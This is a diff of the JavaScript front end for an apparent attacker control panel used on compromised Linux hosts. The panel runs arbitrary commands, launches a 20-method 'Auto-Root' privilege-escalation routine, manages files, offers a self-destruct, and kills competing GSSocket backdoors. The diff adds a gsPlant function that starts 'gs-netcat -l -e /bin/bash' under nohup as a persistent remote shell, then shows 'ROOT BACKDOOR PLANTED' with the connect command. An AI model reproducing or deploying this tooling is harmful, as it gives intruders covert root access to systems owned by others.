@@ -2,18 +2,16 @@ const $=id=>document.getElementById(id);
 const api=async(e,d)=>{try{const r=await fetch('/api/'+e,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d||{})});return r.json();}catch(x){return{error:x.message}}};
 const log=(el,t,c)=>{if(!$(el))return;const d=document.createElement('div');d.className='ln '+(c||'');d.textContent=t;$(el).appendChild(d);$(el).scrollTop=1e9;};
 const clear=el=>{if($(el))$(el).innerHTML='';};
-const copyThis=el=>{navigator.clipboard.writeText(el.innerText);el.style.borderColor='var(--green)';setTimeout(()=>el.style.borderColor='',800);};
 
 document.querySelectorAll('.nav-item[data-p]').forEach(n=>n.onclick=()=>nav(n.dataset.p));
 
-let cwd='/',myGs='',currentFile='',sysData={};
+let cwd='/',currentFile='',sysData={};
 
 function nav(p){document.querySelectorAll('.page').forEach(x=>x.classList.remove('on'));document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('on'));$('p-'+p)?.classList.add('on');document.querySelector('.nav-item[data-p="'+p+'"]')?.classList.add('on');if(p==='exp')loadExp();if(p==='proc')loadProc();if(p==='gs')gsScan();if(p==='files')fmLoad(cwd);}
 function openModal(id){$(id).classList.add('on');}
 function closeModal(id){$(id).classList.remove('on');}
 
 async function init(){
-myGs=$('my-gs')?.innerText||'';
 const r=await api('run',{path:'scripts/sysinfo.sh'});
 try{const d=JSON.parse(r.output||'{}');sysData=d;$('s_user').textContent=d.user||'-';$('s_uid').textContent='uid:'+(d.uid||'?');$('s_kernel').textContent=(d.kernel||'-').split('-')[0];$('s_up').textContent=d.uptime||'-';$('s_mem').textContent=d.mem||'-';$('th').textContent=d.hostname||'target';document.title='DZ • '+(d.hostname||'target');$('cfg-info').textContent=JSON.stringify(d,null,2);}catch(e){}
 fmLoad('/');startLive();checkGsAlert();initMethodList();
@@ -21,9 +19,8 @@ fmLoad('/');startLive();checkGsAlert();initMethodList();
 
 function startLive(){async function u(){const r=await api('exec',{cmd:"cat /proc/loadavg 2>/dev/null|awk '{print $1}';free 2>/dev/null|awk '/Mem:/{if($2>0)print int($3*100/$2);else print 0}';df / 2>/dev/null|tail -1|awk '{gsub(/%/,\"\");print $5}'"});const[load,mem,disk]=(r.output||'0\n0\n0').trim().split('\n');$('live-stats').innerHTML=`<div style="margin-bottom:8px"><div style="display:flex;justify-content:space-between;font-size:10px"><span>CPU</span><span>${load}</span></div></div><div style="margin-bottom:8px"><div style="display:flex;justify-content:space-between;font-size:10px"><span>MEM</span><span>${mem}%</span></div><div class="stat-bar"><i style="width:${mem}%;background:${mem>80?'var(--red)':'var(--green)'}"></i></div></div><div><div style="display:flex;justify-content:space-between;font-size:10px"><span>DISK</span><span>${disk}%</span></div><div class="stat-bar"><i style="width:${disk}%;background:${disk>80?'var(--red)':'var(--green)'}"></i></div></div>`;}u();setInterval(u,5000);}
 
-async function checkGsAlert(){const r=await api('run',{path:'scripts/gscan.sh'});try{const d=JSON.parse(r.output||'{}');const hostile=(d.gsockets||[]).filter(g=>!g.type&&g.secret&&g.secret!==myGs&&g.secret!=='hidden');if(hostile.length)$('dash-alert').innerHTML=`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${hostile.length} Hostile GSockets!</strong><a href="#" onclick="nav('gs');return false" style="color:var(--gold)">View →</a></div></div>`;}catch(e){}}
+async function checkGsAlert(){const r=await api('run',{path:'scripts/gscan.sh'});try{const d=JSON.parse(r.output||'{}');const gs=(d.gsockets||[]).filter(g=>!g.type);if(gs.length)$('dash-alert').innerHTML=`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${gs.length} GSockets Detected!</strong><a href="#" onclick="nav('gs');return false" style="color:var(--gold)">View →</a></div></div>`;}catch(e){}}
 
-// LPE Methods
 const LPE_METHODS=['Sudo NOPASSWD','SUID Binaries','Writable /etc/passwd','Docker Socket','Capabilities','Kernel Exploit','Cron Jobs','LD_PRELOAD','Redis','Password Reuse','NFS no_root_squash','Writable PATH','D-Bus','LXD/LXC','Systemd','SSH Keys','MySQL UDF','Tmux/Screen','Process Monitor','Final Checks'];
 function initMethodList(){let h='';LPE_METHODS.forEach((m,i)=>{h+=`<div class="method-item" id="method-${i}"><span class="method-name">${String(i+1).padStart(2,'0')}. ${m}</span><span class="method-status pending" id="mstat-${i}">pending</span></div>`;});$('method-list').innerHTML=h;}
 
@@ -32,36 +29,11 @@ $('btn-autoroot').disabled=true;$('btn-autoroot').textContent='Running...';
 clear('root-out');$('root-success').style.display='none';$('root-result').innerHTML='';
 initMethodList();
 log('root-out','Starting Auto-Root (20 LPE methods)...','cmd');
-log('root-out','Executing in parallel for speed...','warn');
-
-let idx=0;
-const interval=setInterval(()=>{if(idx<20){$('mstat-'+idx).textContent='checking';$('mstat-'+idx).className='method-status checking';idx++;}},800);
-
+let idx=0;const interval=setInterval(()=>{if(idx<20){$('mstat-'+idx).textContent='checking';$('mstat-'+idx).className='method-status checking';idx++;}},800);
 const r=await api('run',{path:'lpe_methods/runner.sh'});
 clearInterval(interval);
-
-(r.output||'').split('\n').forEach(l=>{
-if(l.includes('[✓]'))log('root-out',l,'ok');
-else if(l.includes('[✗]'))log('root-out',l,'err');
-else if(l.includes('[!]'))log('root-out',l,'warn');
-else if(l.includes('[*]'))log('root-out',l,'cmd');
-else if(l.trim())log('root-out',l,'');
-});
-
-try{
-const jsonMatch=r.output.match(/\{[\s\S]*"root_achieved"[\s\S]*\}/);
-if(jsonMatch){
-const result=JSON.parse(jsonMatch[0]);
-result.methods?.forEach((m,i)=>{if($('mstat-'+i)){$('mstat-'+i).textContent=m.status;$('mstat-'+i).className='method-status '+(m.status==='success'?'success':m.status==='fail'?'failed':'checking');}});
-if(result.root_achieved&&result.root_secret){
-$('root-success').style.display='flex';
-$('root-success-msg').textContent='Method: '+result.root_method;
-$('root-result').innerHTML=`<div class="root-box"><h3>🎉 ROOT ACCESS!</h3><p style="font-size:11px;color:var(--text)">Root GSSocket backdoor installed.</p><code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${result.root_secret} -i</code></div>`;
-}else{
-$('root-result').innerHTML=`<div class="alert"><span class="alert-icon">❌</span><div class="alert-text"><strong>Direct root not achieved</strong>Check output for partial findings.</div></div>`;
-}
-}
-}catch(e){console.error(e);}
+(r.output||'').split('\n').forEach(l=>{if(l.includes('[+]'))log('root-out',l,'ok');else if(l.includes('[-]'))log('root-out',l,'err');else if(l.includes('[!]'))log('root-out',l,'warn');else if(l.includes('[*]'))log('root-out',l,'cmd');else if(l.trim())log('root-out',l,'');});
+try{const jsonMatch=r.output.match(/\{[\s\S]*"root_achieved"[\s\S]*\}/);if(jsonMatch){const result=JSON.parse(jsonMatch[0]);result.methods?.forEach((m,i)=>{if($('mstat-'+i)){$('mstat-'+i).textContent=m.status;$('mstat-'+i).className='method-status '+(m.status==='success'?'success':m.status==='fail'?'failed':'checking');}});if(result.root_achieved&&result.root_secret){$('root-success').style.display='flex';$('root-success-msg').textContent='Method: '+result.root_method;$('root-result').innerHTML=`<div class="root-box"><h3>🎉 ROOT BACKDOOR PLANTED!</h3><p style="font-size:11px;color:var(--text)">GSSocket backdoor installed as root.</p><code onclick="navigator.clipboard.writeText(this.textContent)">gs-netcat -s ${result.root_secret} -i</code></div>`;}else{$('root-result').innerHTML=`<div class="alert"><span class="alert-icon">❌</span><div class="alert-text"><strong>Root not achieved</strong>Check output for partial findings.</div></div>`;}}}catch(e){console.error(e);}
 $('btn-autoroot').disabled=false;$('btn-autoroot').textContent='🚀 Start Auto-Root';
 }
 
@@ -70,7 +42,6 @@ async function runExp(cve){if(!confirm('Run '+cve+'?'))return;const r=await api(
 
 async function rs(path){clear('term-out');log('term-out','$ bash '+path,'cmd');const r=await api('run',{path});(r.output||'').split('\n').forEach(l=>log('term-out',l,'ok'));}
 async function termExec(){const c=$('term-cmd').value.trim();if(!c)return;$('term-cmd').value='';log('term-out','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('term-out',l,''));}
-async function termExec2(c){clear('term-out');log('term-out','$ '+c,'cmd');const r=await api('exec',{cmd:c});(r.output||'').split('\n').forEach(l=>log('term-out',l,''));nav('term');}
 async function loadProc(){clear('proc-out');log('proc-out','$ ps aux --sort=-%mem','cmd');const r=await api('exec',{cmd:'ps aux --sort=-%mem|head -40'});(r.output||'').split('\n').forEach(l=>log('proc-out',l,''));}
 
 // File Manager
@@ -84,16 +55,15 @@ function fmNewFile(){$('modal-new-name').value='';$('modal-new-content').value='
 function fmNewDir(){const n=prompt('Folder name:');if(n)api('mkdir',{path:cwd+'/'+n}).then(fmRefresh);}
 async function fmSaveNew(){const n=$('modal-new-name').value.trim();if(!n)return;await api('write',{path:cwd+'/'+n,content:$('modal-new-content').value});closeModal('modal-new');fmRefresh();}
 async function fmDelete(path){if(!confirm('Delete?'))return;await api('delete',{path});fmRefresh();}
-function fmDownload(path){window.open('/api/download?path='+encodeURIComponent(path));}
-async function fmUpload(files){for(const f of files){const reader=new FileReader();reader.onload=async e=>{await api('write',{path:cwd+'/'+f.name,content:e.target.result});fmRefresh();};reader.readAsText(f);}}
-function fmCtx(e,path){e.preventDefault();const c=prompt('1=View 2=Edit 3=Download 4=Delete');if(c==='1')fmView(path);else if(c==='2')fmEdit(path);else if(c==='3')fmDownload(path);else if(c==='4')fmDelete(path);}
+function fmCtx(e,path){e.preventDefault();const c=prompt('1=View 2=Edit 3=Delete');if(c==='1')fmView(path);else if(c==='2')fmEdit(path);else if(c==='3')fmDelete(path);}
 
-// GSockets
-async function gsScan(){$('gs-list').innerHTML='Scanning...';const r=await api('run',{path:'scripts/gscan.sh'});try{const d=JSON.parse(r.output||'{}');const procs=(d.gsockets||[]).filter(g=>!g.type);const hostile=procs.filter(g=>g.secret!==myGs);$('gs-alert').innerHTML=hostile.length?`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${hostile.length} Hostile!</strong></div><button class="btn btn-sm btn-red" onclick="gsKillAll()">Kill All</button></div>`:'';let h='';procs.forEach(g=>{const mine=g.secret===myGs;h+=`<div class="gs-card ${mine?'mine':'hostile'}"><div class="gs-header"><span class="gs-badge ${mine?'yours':'hostile'}">${mine?'YOURS':'HOSTILE'}</span><span class="gs-secret">${g.secret||'hidden'}</span>${mine?'':`<button class="btn btn-sm btn-red" onclick="gsKill(${g.pid})">Kill</button>`}</div><div class="gs-body"><table><tr><td>PID</td><td>${g.pid}</td></tr><tr><td>User</td><td>${g.user}</td></tr></table></div></div>`;});$('gs-list').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--green)">✓ No hostile</div>';}catch(e){$('gs-list').innerHTML='Error';}}
+// GSSocket Monitor
+async function gsScan(){$('gs-list').innerHTML='Scanning...';const r=await api('run',{path:'scripts/gscan.sh'});try{const d=JSON.parse(r.output||'{}');const items=d.gsockets||[];$('gs-alert').innerHTML=items.length?`<div class="alert"><span class="alert-icon">🚨</span><div class="alert-text"><strong>${items.length} GSockets Found!</strong></div><button class="btn btn-sm btn-red" onclick="gsKillAll()">Kill All Processes</button></div>`:'<div class="alert success"><span class="alert-icon">✓</span><div class="alert-text"><strong>Clean - No GSockets detected</strong></div></div>';let h='';items.forEach(g=>{if(g.type){h+=`<div class="gs-card hostile"><div class="gs-header"><span class="gs-badge hostile">${g.type.toUpperCase()}</span><span class="gs-secret">${g.path||g.line||''}</span></div><div class="gs-body"><table><tr><td>Owner</td><td>${g.owner||'-'}</td></tr>${g.content?`<tr><td>Content</td><td>${g.content}</td></tr>`:''}</table></div></div>`;}else{h+=`<div class="gs-card hostile"><div class="gs-header"><span class="gs-badge hostile">PROCESS</span><span class="gs-secret">${g.secret||'hidden'}</span><button class="btn btn-sm btn-red" onclick="gsKill(${g.pid})">Kill</button></div><div class="gs-body"><table><tr><td>PID</td><td>${g.pid}</td></tr><tr><td>User</td><td>${g.user}</td></tr><tr><td>Mode</td><td>${g.mode}</td></tr></table></div></div>`;}});$('gs-list').innerHTML=h||'<div style="padding:20px;text-align:center;color:var(--green)">✓ No GSockets found</div>';}catch(e){$('gs-list').innerHTML='Error: '+e;}}
 async function gsKill(pid){await api('exec',{cmd:'kill -9 '+pid});gsScan();}
-async function gsKillAll(){const r=await api('run',{path:'scripts/gscan.sh'});try{const d=JSON.parse(r.output||'{}');const pids=(d.gsockets||[]).filter(g=>!g.type&&g.secret!==myGs).map(g=>g.pid).filter(Boolean);if(pids.length)await api('exec',{cmd:'kill -9 '+pids.join(' ')});}catch(e){}gsScan();}
+async function gsKillAll(){if(!confirm('Kill ALL gs-netcat processes?'))return;await api('exec',{cmd:"pkill -9 -f 'gs-netcat' 2>/dev/null"});gsScan();}
+async function gsPlant(){const s=prompt('Secret key for backdoor:');if(!s)return;const r=await api('exec',{cmd:`nohup gs-netcat -s '${s}' -l -e /bin/bash &>/dev/null &`});alert('Planted! Connect: gs-netcat -s '+s+' -i');gsScan();}
 
 async function pull(){await api('pull');location.reload();}
-async function nuke(){if(!confirm('⚠️ DESTRUCT?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:24px">💀 DESTROYED</div>';}
+async function nuke(){if(!confirm('⚠️ DESTRUCT ALL?'))return;await api('destruct');document.body.innerHTML='<div style="display:flex;height:100vh;align-items:center;justify-content:center;background:#000;color:var(--red);font-size:24px">💀 DESTROYED</div>';}
 
 init();
